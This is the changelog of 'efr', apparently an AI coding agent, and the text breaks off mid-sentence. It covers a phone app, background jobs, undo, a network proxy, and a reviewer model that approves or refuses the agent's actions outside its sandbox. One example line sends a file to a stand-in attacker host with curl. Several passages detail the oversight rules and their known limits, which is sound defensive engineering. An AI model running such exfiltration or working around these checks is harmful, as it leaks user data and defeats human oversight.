# Changelog

All notable changes to efr are in this file. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and the versions follow
[Semantic Versioning](https://semver.org/). Before 1.0.0, a minor or patch version can
change behaviour.

Each release has its own section. The release workflow copies the section of the tag
into the GitHub release notes, and it stops when the section is missing.

## [Unreleased]

### Changed

- efrd reads the output of your shell with the terminal core of Ghostty 1.4 (a commit
  from six days before the 1.4.0 release). It follows xterm more closely, parses
  output faster and keeps the fixes of the 1.4 cycle. A build from source now needs
  Zig 0.17.0 in place of 0.16.0. The `efr-code` AUR package downloads it for you.

## [0.0.6] - 2026-10-27

### Added

- A preview of the efr phone app for iPhone, in `app/` of the repository. It pairs
  with `efr device add`, shows your conversations live, sends prompts to them and
  answers the questions of the agent. It connects to efrd directly over Tailscale,
  with no relay. The phone keeps its device key in the Secure Enclave and proves it on
  each connection. The app is not in the App Store: you build it with EAS, as
  `app/README.md` tells, also for its dev, preview and production variants. It ran as a
  dev build on an iPhone with iOS 26. A new page of the docs, "The
  phone app", tells how to set up Tailscale and the listener, pair a phone, revoke
  it, and what a phone cannot do. The troubleshooting page has a new section for the
  phone.
- A new `[remote]` table in `config.toml` for the phone app: `enabled` (default
  `false`), `port` (default 7419) and `tailscaled_socket` (default
  `/var/run/tailscale/tailscaled.sock`). Each key needs a restart of efrd.
- With `[remote] enabled = true`, efrd listens for the phone app on the Tailscale
  IPv4 address of this machine, and on no other address. It needs tailscaled 1.100 or
  later with a TUN device (not userspace networking). efrd asks tailscaled who each
  peer is before it reads a byte, and it lets in only a device of your own Tailscale
  user that proves its paired key. It refuses this machine itself, tagged nodes,
  shared nodes and other users. When Tailscale stops, or the address or the tailnet
  changes, efrd closes the phone connections and listens again on the new address.
  A revoked device loses its connections at once. `daemon.json` shows the address as
  `tailnet_endpoint`. The settings tool marks `remote.enabled` and
  `remote.tailscaled_socket` as changes that loosen permissions.
- `efr device add` pairs a phone with efrd. It shows a QR code in the terminal, below
  the command line. The code holds a one-time token that is good for one phone and for
  5 minutes. When the phone sends it, efr shows the phone's name, its Tailscale node
  and user, and the fingerprint of its key, and asks you. Only your yes pairs the
  phone. `--invert` swaps the dark and light parts of the code for a terminal with a
  light background. `efr device add` needs `[remote] enabled = true` and Tailscale.
- `efr device list` shows the paired devices, also the revoked ones, with when each one
  was paired and last seen. `efr device revoke <id>` takes a device's access away for
  good; the id can be the start of an id, as the list shows it.
- A question of the agent now tells a client why the permission mode of the turn
  asks, in one plain line, such as "cautious asks before any network access." The
  phone app shows it below the command. The terminal shows the question as before.
- efrd can send a client each change of its lists of conversations as it happens
  (`conversations.watch`): the title, the status and the count of turns of each
  conversation, and its delete. The phone app uses it, so a new question or the end of
  a turn shows in its lists at once. With an older efrd, the app asks again every 10
  seconds.
- The phone app pairs in one full screen, step after step: the command to run, the
  scan, the name and the key to compare with the terminal, and the paired machine.
  Each error has its own screen and one action: an expired code, a code of another
  machine, Tailscale off, a no in the terminal, an efrd that is too old or too new, and
  the camera off. When Tailscale was off, the app tries again by itself when you come
  back to it. When no machine is paired, the app opens on the first step.
- The phone app pairs with more than one machine, and connects to all of them at the
  same time. Each machine has its own device key. Pair another one from Settings or
  from the machine menu. Settings lists each paired machine with its connection and
  its efrd version. The menu of a row copies the node name, pairs the machine again
  or forgets it. Forget asks first, and after the last machine the app goes back to
  pairing. Settings also has the Haptics switch and the version of the app.
- The phone app opens on a blank conversation of the machine that you used last. Its
  composer shows `~` and the mode of a new conversation. Your first message there
  starts a new conversation on that machine, and the app opens it at once. The menu
  at the left of the bar picks another machine.
- Each screen of the phone app has a native bar, with Settings and New on the right.
  The title opens the conversations sheet, the one place to switch conversations. On
  iOS 26 the bar is Liquid Glass, and the system softens the transcript only under
  the bar. The stack keeps at most 8 conversations, and a conversation that is in the
  stack opens where it is.
- The conversations sheet of the phone app lists the conversations of every machine:
  "New conversation" on top, then the ones that wait for an answer, today, this week
  and older. Each row has a glyph of its status, and its machine and directory under
  the title. Its search finds a conversation by title, machine or directory, and then
  asks efrd. Touch and hold a row to copy its title or its id.
- A conversation in the phone app shows your prompts, the replies as they stream, the
  reasoning, the tools that run, the edits with their diff, and a line at the end of
  each turn. Tap a reasoning row or a tool block to open it, or "show all N lines" to
  see the whole output. A failed turn shows its reason, with "retry" and "copy error".
  Touch and hold a message to copy it, and a code block has its own copy button. The app
  asks before it opens a link, and then opens it in the app. An image in a reply shows
  as a link, and HTML shows as text, so a reply cannot make the phone load a URL. The
  list follows new content only while you are near the end, and it does not move when
  you open or close a block. A short conversation stays at the bottom. When you are more
  than one screen from the end, "Jump to latest" takes you back. At the top of a long
  conversation, the app gets the older turns from efrd and keeps them on the phone. When
  the machine goes offline, the conversation keeps its transcript and gets the new
  events when the machine is back. VoiceOver tells you when a question waits and when a
  reply is done, and a turn that fails while you look at it gives an error haptic.
- The composer of the phone app is a glass pill that floats over the end of the
  transcript, with a status line at its top. It sends a prompt and stops the running
  turn. While a turn runs, "Steer now" adds your text to the turn, and "Queue" sends
  it when the turn ends; touch and hold the capsule to pick one. A queued prompt can be
  withdrawn. A prompt shows at once, and the app sends it again after a lost
  connection or after iOS closed the app; efrd runs it only once. The app keeps the
  draft of each conversation.
- A question of the agent in the phone app shows the command or the diff of the file,
  the directory and why the mode asks, with Allow and Deny. A question that only your
  computer can answer says "Answer on" and the name of the machine, with no buttons.
  A question shows how long it can wait, and "expired while you were away" when its
  time ran out while the app was closed. When another conversation waits for an
  answer, a strip under the bar and a dot on the title tell you. A tap on the strip
  opens that conversation at the question; when two or more wait, it opens the sheet
  with them on top.
- The phone app connects again at once when the phone changes its network, such as
  from Wi-Fi to cellular. A glass capsule under the bar tells you when a machine is
  offline or when Tailscale on the phone is off.
- The phone app has its own icon, "the yolk": an egg with a yolk, and a ❯ in the yolk.
- A dev or preview build of the phone app has a gallery of every screen and state of
  its design. A long press on the version in Settings opens it. Three demo machines
  (desktop, laptop and homelab) play efrd inside the app and reach no computer, so you
  can see each screen without a paired machine.

### Changed

- A client that follows a turn live on a slow link no longer loses parts of the
  streamed text. When efrd cannot send each part at once, it joins the parts and sends
  them together as soon as the client reads again. The text then grows in larger
  steps, with no gaps.
- A client that opens a conversation while a turn runs now gets the text that the
  model has sent so far, and the reasoning of the turn, at once. So the phone app shows
  a running reply at once.
- A question that only your own computer may answer (a command that runs as another
  user, a background job, or a delete that full mode guards) now says so to every
  client. efrd refuses an answer to it from a phone, and it also refuses from a phone
  an input for a running command, such as a password.

## [0.0.5] - 2026-10-25

### Added

- Each background job now runs in a cgroup of its own when efrd runs as its systemd
  unit. The unit now has `Delegate=yes`. When you stop a job, efr kills every process
  of the job, also a process that left the job's session with `setsid`. `efr jobs list`
  and the model's `jobs` tool show the memory and the CPU time of each running job.
  Without a delegated cgroup, a job ends by its session as before, and `efr jobs list`
  says why. Install the new unit, then run `systemctl --user daemon-reload` and
  restart efrd.
- Ctrl+B also moves a command that a call left running in the hidden shell into a
  background job, while the command waits for no input: in the turn view while no
  call runs, and in `,shell`. A command outside the sandbox asks first, as a running
  call does. The hidden shell is free at once, and the job's notice tells the agent
  when the command ends. Before, such a command held the hidden shell until it ended.
- `efr conversation delete <id>` deletes a conversation and everything that efr keeps
  of it: its events, its search text, the recordings of its hidden shell, its
  `$SCRATCH`, its sandbox dirs, its snapshots and its undo trash. The id can be the
  start of an id, as `efr search` shows it. efr asks first on a terminal, and `--yes`
  skips the question. Without a terminal, efr deletes only with `--yes`.
- Before a delete, efrd stops the background jobs of the conversation and closes its
  hidden shell. When another open terminal holds the conversation, or a turn runs in
  it, efr asks again. `--force` deletes in both cases with no question. efr never stops
  an undo that runs. If efrd stops during a delete, you never see half a
  conversation: the conversation goes from every list and search at the first step,
  and the next start of efrd removes the rest.
- Ctrl+D in the `,resume` picker deletes the selected conversation after a question on
  one line. Then the picker opens again with its query.

### Changed

- efrd now deletes old recordings of the hidden shells' terminals. Once an hour, it
  deletes the recording of a shell that exited more than 14 days ago
  (`recording.max_age_days`), and, while all recordings take more than 2 GiB
  (`recording.max_gib`), the oldest parts first. It always keeps the newest part, and
  at least the last 1 MiB, of a shell that still runs. 0 turns a limit off. Before,
  efrd kept every recording forever, so the data directory grew without a limit. A
  client that resumes from output that was deleted gets a screen snapshot, or for an
  exited shell, only what is left.
- Some very long or deeply nested shell lines now get a stricter decision. Before,
  each of these lines could make efrd use all its time and memory, or stop efrd with
  all its conversations:
  - A line with many relative `cd`s is judged as after `cd -`: a relative path may be
    anywhere below `/`, so efr runs the line in the sandbox or asks you. This occurs
    when the rest of the line may run in more than 1024 directories, that is, after
    more than ten `cd`s into subdirectories in a row.
  - efr reads a command substitution inside another one down to 64 levels. A line
    that nests deeper holds code that efr does not read: only you approve it outside
    the sandbox, and full mode asks you before it runs.
  - An `ask` or `deny` rule for a program reads at most 16 forms of that program in
    one command, such as each `git` after `env`. A command with more, such as
    `env git git git ...`, matches the rule, so efr asks you or refuses it. Before,
    10,000 `git` words took about 1 second for each rule.
- An `ask` or `deny` rule for `systemctl`, `cargo`, `docker` or `kubectl` now skips
  the program's own options before the subcommand, as a rule for `git` does. So a
  rule for `systemctl restart` also asks for `systemctl --user restart nginx`, a rule
  for `cargo publish` for `cargo +nightly publish`, a rule for `docker push` for
  `docker -H ssh://prod push app`, and a rule for `kubectl delete` for
  `kubectl -n prod delete pod web`. An option that efr does not know counts both with
  and without a value, so the rule asks rather than misses. `cargo --config` with a
  file or an alias, and `kubectl --kuberc`, can rename a subcommand, so the rule
  matches every command with one of them. An `allow` rule still compares the words
  right after the program.
- The diff of an approval preview and of a finished write now shows only the changed
  hunks. Before, two small changes far apart in a large file showed as the whole file
  removed and added again, and the added and removed counts were wrong.
- In a long block that is still open (from 4 KB, such as a large table or a long list
  item), the last line shows when it is complete, not letter by letter. A line of
  code shows at once.
- Long conversations are faster and use less memory. The request that the model gets
  does not change, so the prompt cache of your provider still works:
  - After a compaction with a summary, a prompt reaches the model sooner, because a
    turn no longer reads or rebuilds the earlier turns that the summary covers. In a
    conversation of 2,000 turns, the time from the prompt to the model request went
    from about 44 ms to about 21 ms.
  - A prompt starts with less work and less memory. efrd no longer reads the earlier
    turns again from the database and the event log for each prompt, and a tool
    output in memory no longer uses up to two times its size. After a restart of efrd
    or 10 idle minutes, only the first prompt reads the earlier turns. In a test of 20
    conversations of 50 turns, efrd allocates about one third less memory for each
    turn.
  - In `auto`, a shell call with background jobs no longer reads every turn of the
    conversation to find when the previous turn started.
  - A terminal that attaches to a conversation with long answers shows it sooner.
    With answers of 500 KB, this took about 340 ms. Now it takes about 20 ms.
  - With the OpenAI WebSocket transport, each connection keeps about 40 bytes for each
    item of the history. Before, it kept a copy of all of the history of its last
    call, which is several MB in a long conversation. A call also starts sooner.
  - `efr diff --stat --all` reads the history in pages of 500 events, and it keeps
    only the ends of the turns that changed files and the undos. For 20,000 events,
    its peak memory went from about 28 MiB to about 12 MiB. When the history has more
    than 1,000 pages, a dim line now says that efr adds up only the turns of the
    newest 1,000. Before, efr left out the older turns and did not say so.
- efrd gives memory back after an idle period. When a conversation was idle for 10
  minutes, efrd no longer keeps its messages in memory, and the next prompt reads
  them from the store. Then, when no turn ran for 30 seconds, efrd tells glibc to give
  its free heap back to the system, at most one time in 5 minutes. In a test of 20
  conversations of 50 turns, efrd then used about 60 MiB, about one third of its peak.
  Before, efrd kept the messages of each conversation that ran a turn since it
  started, so its memory grew with use, and it kept about 90% of its peak.
- Calls in large projects and in your home directory are faster. Undo, the undo
  trash and the list of what undo does not cover do not change:
  - The snapshots before and after a call in a project of 20,000 files took about
    54 ms. Now they take about 18 ms, because git checks the files on more than one
    thread.
  - After a command writes many files again, the next calls are fast again. With
    5,000 files of 10 KB, each later call took about 210 ms. Now it takes about 6 ms.
  - The end of a turn whose snapshots leave out many paths, such as thousands of
    ignored files, took about 20 seconds for 20,000 paths. Now it takes less than a
    tenth of a second.
  - A call that can write in a large directory outside your projects took more than
    12 seconds to start and end for 20,000 files. Now it takes less than a second.
  - A call that changes thousands of home files ends faster. A cache delete of 20,000
    files took about 7 seconds. Now it takes about 1 second.
  - Each turn in a git repository starts one git process fewer, so a prompt in a
    repository outside your projects also gets its answer sooner. `efr undo` starts
    one git process for each file that it writes back, not two. In `auto`, while
    background jobs run in the project, a command starts faster, because efr runs git
    only for a git config that changed since the last check.
- A command that prints much output uses less CPU. efr reads the output of the hidden
  shell in chunks of up to 64 KiB, so it hands on 3 to 10 times fewer chunks. A prompt
  still shows as soon as the shell prints it. With the ghostty screen, the result of a
  command whose output moves the cursor, such as a build with a status line, is ready
  sooner, because efr reads only the 1,000 newest rows of each screen. The text of the
  result does not change.
- Replies and question cards draw faster:
  - A long reply streams with less CPU. Before, each draft of the model copied all of
    the reply before it, and a reply of 1 MB used about 1 second of CPU.
  - A very long code block renders in a time that grows only with its length. Before,
    100,000 lines in a `text` block took about 4 s. Now they take less than 0.1 s.
  - A question card shows a long command fast. Before, a command line of 100 KB took
    up to 2 seconds on a terminal that counts by grapheme cluster.
  - While a question waits for your answer, efr draws its card again only when the
    card or the width of the terminal changes, not at each tick of the status row.
    A card with a diff used about 1 ms of CPU for each tick.
  - The input row under a running turn draws a long paste in about half the time.

### Fixed

- A long shell line no longer stalls efrd before the call starts. The decision and its
  questions do not change:
  - efr checked each path of the line against each other path, so an `rm` of a few
    thousand files took about 9 seconds before it ran. Now it takes a fraction of a
    second. A long line behind a wrapper such as `env` or `time` under your `ask`
    rules no longer uses gigabytes of memory.
  - A line with many `cd`s took about 11 s for 10,000 `cd`s in `auto`, and about 41 s
    for 2,000 `cd`s in full mode. Now 10,000 `cd`s take about 10 ms in `auto` and
    15 ms in full mode. A line of 10 `cd`s starts after about 20 ms, not 90 ms.
  - In `auto`, the decision for an `rm` of 6,400 files outside your projects took up
    to about 2.8 seconds and 540 MB of memory. Now it takes about 50 ms and 10 MB.
- A long code block in a list item or a quote streams at the same speed at line 1,000
  as at line 30. Before, efr fell behind the reply at a few hundred lines. Parts of
  the text then came late in one jump.
- A followed turn now shows every event after a long gap. When efr subscribed again
  after it fell behind or after a new connection, or when a prompt waited behind many
  events, and more than 128 events or 1 MiB came in the gap, efrd sent only the newest
  events, and the older ones never showed. efr now reads them with
  `conversation.history` and shows each event once and in order, also an event over
  1 MiB.
- When the newest event of a conversation is larger than 1 MiB, the snapshot at the
  start of `conversation.subscribe` now has a history cursor. Before, the snapshot had
  no events and no cursor, so a client could not find that event and the events
  before it.
- On a very narrow terminal, a wide character that did not fit in a row of a question
  card showed two times. Now it shows one time.
- A `!` in a project's name now shows as typed in `$efr_scope` and `efr_prompt_info`
  when your zsh has `prompt_bang` set. Before, the prompt showed the history number
  in its place. With `prompt_bang` set, both now write each `!` as `!!`.

### Security

- efr now uses tokio 1.53.3. This version fixes the advisory RUSTSEC-2026-0386 of
  tokio 1.53.2 (`AsyncFd` and I/O safety). Each `AsyncFd` of efr owns its
  descriptor, so efr was not open to the fault.
- efr now uses ctutils 0.4.5 in the keyring build. This version fixes the advisory
  RUSTSEC-2026-0385 of ctutils 0.4.2.
- In `auto`, only you approve an ssh control socket, never the reviewer. A control
  socket is a logged-in session, and it, not the host on the line, decides where a
  command runs. This applies to a line with `ssh -S`, `ssh -M`, `ssh -O`, an `-o` of
  `ControlPath`, `ControlMaster` or `ControlPersist` (also for `scp`, `sftp`, `sshfs`
  and `rsync -e`), and to a socket grant of a socket that an ssh process listens on or
  that a `ControlPath` of your ssh config names. Before, the reviewer could approve
  such a line when a message of yours named its host.
- An `ask` or `deny` rule with `under` now applies after a `cd` in the line, unless
  efr can prove that the command runs outside the rule's directory. Before, the rule
  matched nothing after any `cd`, so `cd sub && git push` ran without the question or
  the refusal of a `deny git push` rule for `~/work`. Now efr reads where each `cd`
  goes: a target that is absolute or below `~` counts, together with the directory
  before it, because a `cd` can fail. After a relative `cd`, `cd -`, `popd` or a `cd`
  to a variable, the directory is unknown and the rule applies. An `allow` rule with
  `under` still matches only before the first `cd`.
- `time cd /x` now counts as a change of directory. zsh runs it in the shell, so
  before, a rule with `under` judged the commands after it by the old directory.
- An `ask` or `deny` command rule now also applies to a line that efr cannot split
  into simple commands, such as `git push $(git branch --show-current)` or
  `cd "$DIR" && git push`. efr reads each command that it finds in the line, the
  commands of a substitution too. Before, only a rule for every command line judged
  such a line, so in full mode it ran with no question although a rule of yours
  denied `git push`.
- The numbered list of `,resume` without fzf now shows each title with its secrets
  replaced by `[***]`, as the picker and `efr search` show it. Before, the list
  showed the raw title of the first prompt, with a key that the prompt held.

## [0.0.4] - 2026-10-23

### Added

- In `auto`, a reviewer model now decides most actions that leave the sandbox, so you
  see far fewer questions. It reads your messages and the facts that efr collects,
  never the output of a command. It allows an action that fits what you asked,
  refuses an action that nothing you said relates to, and gives an unsure case to
  you. While it works, the status row shows `reviewing: <command>`. Its answer stays
  as one line, `reviewer allowed: ...` or `reviewer refused: ...`. An allow opens that
  one path, host, socket or device for one call. `docs/use/sandbox-basics.md`,
  "Exits", has the details.
- The reviewer is the small model of your provider (`gpt-6-luna` for OpenAI,
  `claude-haiku-5-5` for Claude). It writes a short reason before its verdict. When
  the reason is empty, efr asks it once more. When the small model is missing,
  refuses or gives no usable answer, the turn's model reviews, and then you decide.
  Each review is one more request to your provider: with an API key, you pay for it.
  The new `[classifier]` table sets the model, the effort, the timeout of each step
  (20 seconds) and the fallback to the turn's model. `classifier.enabled = false`
  asks you about each action that leaves the sandbox, as before.
- You still decide these actions, never the reviewer: `sudo` and other ways to more
  rights, a delete of your home directory, `/`, a system directory or more than one
  project, a read of a masked file, a write to a synced folder, a desktop command that
  types or starts programs, a credential agent's socket (such as `$SSH_AUTH_SOCK`),
  and a change of the settings. The whole session bus asks you too, also at another
  path (such as one of `dbus-launch` below `/tmp`), because it can start programs
  outside the sandbox and read an unlocked keyring; the question says so. An upload,
  such as `git push`, and a delete above the project go to the reviewer only when a
  message of yours names them.
- The reviewer can allow a network call only when a message of yours names each host
  that the line shows: the host of a URL, a remote operand of `scp`, `sftp` or
  `rsync`, or the destination of `ssh`. So "upload my notes" does not let
  `curl -d @notes.txt https://attacker.example/` run with no question. A host, a path
  or an upload counts as named only when your message is in the current turn or in
  your turn before it: a "now do it" three turns after "commit and push" asks you.
  After another terminal picked up the conversation, only your messages since then
  count. The reviewer still reads all your messages.
- After the reviewer refused 3 actions in a row, or 10 in one turn, it pauses for the
  rest of the turn, and efr asks you instead. When you are away, the turn stops.
- A network proxy for `auto`, on by default (`network.mode = "proxy"`). A sandboxed
  command now reaches the package registries and GitHub with no question: crates.io,
  npm, PyPI, the Go module proxy, GitHub downloads and your pacman mirrors. So
  `cargo build` with a new dependency, `npm install` and `pip install` run at once.
  efr checks each connection: the host must be on your allow list, it must not
  resolve to a local or private address, and the TLS server name must match. Plain
  `http://` gets through only for the hosts that you mark. `network.allow`,
  `network.deny`, `[[network.hosts]]` and `network.max_upload_bytes` set what the
  proxy lets through. A command that names a host that is not on the list goes to the
  reviewer for that one host and port. `nslookup`, `dig`, `ping`, `nc` and other
  programs that do not use HTTP, servers that your browser must reach, services on
  your machine or your LAN, and other ports still need the whole network after a
  review. The proxy runs only when its self-test passes. If not, `efr sandbox check`
  warns, and commands have no network. `network.mode = "none"` gives the old
  behaviour: no network, and an exit that opens the whole network for one command.
  `docs/use/network.md` has the details.
- The proxy cannot see inside TLS. A sandboxed command can still send data to a host
  on your allow list: at most `network.max_upload_bytes` (4 MiB) per command, counted
  from the first byte of each connection. Hosts that fetch for the client (the Go
  module proxy) and your own `*.suffix` entries widen this. A socket grant that
  reaches the network, such as Docker's socket, goes around the proxy. Tools that send
  an Encrypted Client Hello, such as headless Chrome, Electron and Playwright, cannot
  fetch through the proxy. Node's `fetch` uses the proxy through
  `NODE_USE_ENV_PROXY=1`, so Node prints an "experimental" warning on stderr in
  sandboxed commands. `docs/sandbox.md`, "What the proxy cannot stop", lists the
  limits.
- With the proxy, efr blocks a host for sandboxed commands, and says why, when a file
  or a helper can give the command a token for that host. This covers a password or a
  token for the host in your git config (also `~/.gitconfig` and its includes, also
  for a command outside a project) or in the project's `.npmrc`, `.yarnrc.yml`,
  `.yarnrc`, `bunfig.toml` or `.cargo/config.toml`. It also covers a git credential
  helper that can hand out a token: a `!` command, or a helper that efr does not know
  (not `libsecret`, `store`, `cache` or `manager`), such as `oauth` or
  `pass-git-helper`. The note names the helper. A helper for one site blocks only that
  site. A helper for every site blocks the hosts of the repository's remotes. A
  `gh auth git-credential` helper blocks no host while the sandbox hides gh's token,
  so `git clone` and `git fetch` from GitHub work in the sandbox. Move a token to a
  file that the sandbox hides, such as `~/.npmrc`. A socket grant to git's credential
  cache asks only you. `efr sandbox check` warns about each `sandbox.env_keep` entry
  that looks like a secret, because the proxy lets it reach the allowed hosts.
- A command that the proxy refused shows `network: blocked <host:port> (<reason>)`,
  and the model reads why. A host on the deny list, or a host that efr blocks for a
  token, shows `denied for this command`, and the model reads that no host grant
  helps. A background job lists its refusals in the line of its end, in the view, in
  `efr history` and in `efr jobs stop`. The reviewer sees the hosts that the proxy
  refused in the last command and in the jobs, but only as a fact, never as your
  request. A denied host is not one of them.
- `efr undo` takes back the newest turn of this terminal's conversation. It shows
  what it will do (restore, trash, delete, ref) and asks `undo? y = yes, n = no`. It
  restores the files that the turn's commands changed in the project, in `$SCRATCH`,
  in the other projects that the turn wrote and outside the projects, and the
  branches that the turn moved. It also removes the empty directories that the turn
  made outside the project, such as a `*.wants` directory. A file that changed after
  the turn stays, and the preview lists it; `--force` overwrites it. When only
  `--force` acts on the rows of the preview, `efr undo` without it changes nothing
  and fails with that hint. A change that you made during the turn between two
  commands stays. `--redo` takes back the undo. `--list`, `--turn` and `--dry-run`
  help you pick. Without a terminal, `efr undo` needs `--yes`.
  `docs/use/undo-and-diff.md` has the details.
- `efr undo` keeps your git index as it is. Every file that undo overwrites or removes
  goes to `~/.local/share/efr/undo-trash/` first, and a directory that undo makes
  again gets mode 0700. An undo that stops at a write that fails says
  `undo stopped: ...`, and the next `efr undo` finishes it. An undo that can write
  nothing leaves the turn as it is. The preview of a `manual` or `cautious` turn says
  that writes outside the project are not covered.
- After a stop of efrd, or for a call that you interrupted or that ran past its
  timeout, `efr undo --force` takes back the changes of the turn's calls, also those
  of `write_file`, `edit` and `apply_patch`. Such a turn says
  `not covered: <project> (a call did not finish)` or
  `<path> (the call did not finish)`.
- `efr undo` refuses while a background job of the conversation runs, or while a job
  of another conversation can write in the same project, and names the job:
  `job j3 runs; stop it first (efr jobs stop j3)`. A job outside the sandbox can write
  everywhere, so it blocks every undo. When a job ends, its file changes join the turn
  that started it, and the undo of that turn needs `--force`. A file that a later turn
  changed in the meantime stays with that turn. When the job notice turn of a job's
  end changed nothing, `efr undo` with no `--turn` passes over it and takes back the
  job's turn. Snapshots leave `$SCRATCH/jobs` out.
- Undo also covers files outside the project in `auto`. Before efr writes a file
  outside the project and `$SCRATCH`, such as `~/.zshrc` or `~/Documents/notes.md`,
  or deletes a cache, it copies the file into its snapshot store. A file that did not
  exist before goes to the undo trash. A directory with more than
  `snapshot.home_max_files` files (2000) or `snapshot.home_max_mib` MiB (256) gets no
  copy, and the end of the turn says so. For a directory that holds a git repository,
  such as `~/notes` with `~/notes/.git`, efr copies the files but not the `.git`, and
  the end of the turn says that undo does not cover `~/notes/.git`.
- At the end of an `auto` turn, one line says what changed and that you can take it
  back: `changed 4 files (+12 -3) in <project> and 2 in ~; efr undo reverts this turn`.
  A turn that only moved refs says
  `moved 1 ref in <project>; efr undo reverts this turn`. A file inside the project,
  such as `.env`, belongs to the project's snapshot, also when the sandbox hides it.
  Files that undo cannot bring back, such as a large ignored file, show on a line
  `not covered: ...`. The lines come also when the turn failed or you interrupted it.
  `efr history` shows the same lines; for a turn that undo cannot take back, it shows
  the line of the changed files, such as `3 files changed, +24 -7`. `efr history`
  shows each undo as one line, and `--verbose` adds each snapshot.
- New keys for undo: `undo.enabled`, `snapshot.mirror_max_mib`,
  `snapshot.home_max_files` and `snapshot.home_max_mib`.
- When a command in `auto` deletes files in a tool cache, such as `~/.cache` or
  `~/.cargo`, the reviewer decides whether efr deletes them in your real cache too. So
  "free some disk space" frees real space. efr never deletes below `~/.cargo/bin`, a
  cargo config or a credentials file. The call shows the freed size.
- Background jobs. The model can start a long command, such as a dev server, a watcher
  or a slow build, as a job with `background: true`. The call answers at once with the
  job's id and its output file. In `auto`, the job runs in the same sandbox as a normal
  command. In `cautious` and `manual`, efr asks you before each job starts, and the job
  runs as an approved command does. A job runs at low CPU and disk priority, with no
  terminal. efr writes its output to `$SCRATCH/jobs/<id>.out`: the first 1 MiB and
  the last 8 MiB. A job ends when its command ends, when you or the model stop it,
  after its time limit (60 minutes unless the model asks for more, at most
  `jobs.max_minutes`), or when efrd stops. After a restart, efrd ends each job that
  still ran. Esc and the end of a turn do not stop a job. The model reads and stops
  its jobs with the tools `jobs` and `job_stop`. `docs/use/jobs.md` has the details.
- New keys for background jobs: `jobs.enabled`, `jobs.default_minutes`,
  `jobs.max_minutes`, `jobs.max_running`, `jobs.max_running_daemon`,
  `jobs.max_wakes_per_hour`, `jobs.max_wakes_per_hour_daemon`,
  `jobs.max_wakes_per_watch`, `jobs.nice` and `jobs.forward_ports`.
- efr refuses a background job whose line asks for sudo, reads a masked file such as
  `.env`, types into your desktop, uses the D-Bus bus (except the read-only queries of
  the bus filter), a container engine or a service manager socket, runs `nmcli` or
  `iwctl`, or changes a file that runs code later, such as `~/.zshrc`. This holds in
  every mode, also after you answer yes. The model must run such a part in the
  foreground. Outside `auto`, an approved job runs with your rights, so a program that
  it starts can still do these things; only a setuid program cannot give it more
  rights. In `auto`, a delete that undo covers still goes to the reviewer when it runs
  as a job.
- A question about a background job says how long the job and what a yes opens last:
  `runs as a job for up to 60 minutes; these grants stay open until it ends`. Only
  your own terminal answers it, never a phone. What the reviewer allows also stays
  open for the whole job, so it judges the job's command for its whole time limit. In
  a turn that a job notice started, it allows only what an earlier message of yours
  asks for.
- When a background job ends, efr tells the model with a job notice. A notice is never
  your input: it never answers a question and never counts as your permission. When
  the conversation is idle, the notice starts a short turn, marked
  `(job notice, not your input)`, in every mode, at most `jobs.max_wakes_per_hour`
  times per hour in the conversation and `jobs.max_wakes_per_hour_daemon` times in
  all. Such a turn runs at most 20 tool calls, and a job that it starts never starts
  another one. It runs in the mode of your newest prompt, at most `auto`, so outside
  `auto` its commands ask you as usual. A question in such a turn waits only the away
  wait unless you follow the conversation, and its card has `(job notice turn)` in
  the title. A `watch` pattern can also wake the model on a matching output line. The
  notice of a job that the model stopped, or that efrd stopped because full mode went
  off, starts no turn. A notice over the limits rides in your next prompt.
- While efr follows a turn, the view shows a line when a job starts, such as
  `job j3 started; output $SCRATCH/jobs/j3.out; ends in 60 minutes`, and when a job of
  the conversation ends, such as `job j3 ended with exit 3 after 1 minute; 2.0 KB
  output`. The line also says when processes of the job may still run, and why a job
  notice did not start a turn. A call that starts a job shows `(background)`. A turn
  that a job notice started shows `🤖 (job notice, not your input)`, in the view and
  in `efr history`. `efr history --verbose` adds the last lines of a job's output and
  the text of each notice.
- In a terminal that does not follow the conversation, the next prompt shows one line
  when a job ends, such as `efr: job j3 ended (exit 0): <title>`, or when its notice
  waits for your next prompt. The line also names a lost launcher and the processes of
  the job that may still run. After a job notice turn, the line names the jobs and the
  first line of the answer. After a restart, efrd writes a line for each job that it
  ended. A notice from before your terminal opened does not show.
- `efr jobs` (or `efr jobs list`) lists the jobs of this terminal's conversation,
  newest first: the id, the state, when it ends or ended, the size of its output, its
  ports and its command. `--all` lists the jobs of every conversation with its title,
  and `--conversation` names another one. `efr jobs stop <id>` stops a job and shows
  how it ended and the last 10 lines of its output. An unknown job exits 1. efr removes
  the output file of a job 7 days after the job ended, and keeps at most the 20 newest
  outputs of ended jobs per conversation.
- In the input row of a followed turn, Ctrl+X stops the newest running job of the
  conversation. It asks first: `stop job j3 (npm run dev)`, `y` yes, `n` no. With no
  running job, it says `no job runs`. Esc still stops only the turn, never a job.
- Ctrl+B in the turn view moves the agent's running shell call to the background as a
  job, whatever the input row holds. A call in the sandbox moves at once and keeps its
  sandbox. A call that runs outside the sandbox asks one `y/n` question first, because
  the command keeps running with your rights after the turn. The turn goes on at once.
  The model reads the output so far and the job's id, and a job notice follows when
  the command ends. The next call gets a new hidden shell in the same directory.
  `efr jobs` shows when a moved command waits for input that nobody can type. In tmux,
  press Ctrl+B twice. A command that waits for input, that can ask at the terminal
  (such as `sudo`), or that efr does not allow as a job cannot move, and neither can a
  call that holds the sandbox's cache. `docs/use/jobs.md`, "Move a running command to
  the background", has the details.
- In `auto`, a loopback port that a contained background job listens on is reachable
  on the same port of `127.0.0.1` on your machine, so your browser opens a dev server
  that the model started. The view shows
  `job j1 listens on 127.0.0.1:8765 -> http://localhost:8765`, and `efr jobs` lists the
  ports. efr forwards TCP ports from 1024 up. It never forwards a port that is in use
  on your machine, port 3128 of a proxy job, or a well-known service port, such as
  5432, 6379 or 1455 of `efr login`. Only your own user's programs can connect. The
  forward ends with the job. A foreground call and a moved call get no forward.
  `jobs.forward_ports = false` turns it off.
- The model learns whether efr forwards each port of its jobs. Before its next step,
  also in the same turn, it reads a note from efr: the URL of a forwarded port, or the
  reason why efr does not forward a port, with the advice to choose another port. So
  the model does not give you a URL that opens another server. The `jobs` tool shows
  the outcome of each port.
- In `auto`, a contained command reaches the forwarded ports of its conversation's
  jobs at `127.0.0.1` and `localhost` with no question, so the agent can check the dev
  server that it started. A line that names a port of a job that efr does not forward,
  such as a port that a program of yours uses, does not run: the whole network would
  reach your program, not the job. efr asks you nothing and tells the agent why, such
  as `efr: port 8767 of job j1 is not forwarded: 127.0.0.1:8767 is in use on this
